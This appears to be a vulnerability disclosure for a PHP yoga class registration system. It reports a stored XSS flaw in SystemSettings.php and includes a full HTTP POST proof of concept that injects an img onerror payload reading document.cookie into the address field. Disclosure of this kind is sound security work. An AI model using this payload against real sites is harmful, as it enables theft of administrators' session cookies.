## Yoga Class Registration System has xss vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html

## Vulnerability file
/php-ycrs/classes/SystemSettings.php

## Vulnerability analysis

<img width="1274" alt="image" src="https://github.com/user-attachments/assets/5c5749ec-c9c5-4edf-81bd-a68d17a95183">


## describe
There is a vulnerability in the yoga registration system that allows unrestricted xss. An attacker can exploit this vulnerability to obtain cookies on the target system without authorization.

POC
```
POST /php-ycrs/classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------112480584639099169332366192534
Content-Length: 646
Origin: http://localhost
Connection: close
Referer: http://localhost/php-ycrs/admin/?page=system_info/contact_info
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------112480584639099169332366192534
Content-Disposition: form-data; name="phone"

456-987-1231
-----------------------------112480584639099169332366192534
Content-Disposition: form-data; name="mobile"

09123456987 / 094563212222 
-----------------------------112480584639099169332366192534
Content-Disposition: form-data; name="email"

info@xyzsanitizationservices.com
-----------------------------112480584639099169332366192534
Content-Disposition: form-data; name="address"

7087 Henry St. Clifton Park, NY 12065<img src=1 onerror=alert(document.cookie)>
-----------------------------112480584639099169332366192534--
```

The front desk submits, and the backend administrator logs in and triggers xss without any sense.
<img width="1510" alt="image" src="https://github.com/user-attachments/assets/8e53d3c5-e2b2-4bc7-af8a-16f6b2b4d3f3">

<img width="1510" alt="image" src="https://github.com/user-attachments/assets/41af8275-e9ec-4ec5-9316-fbc2afc80646">












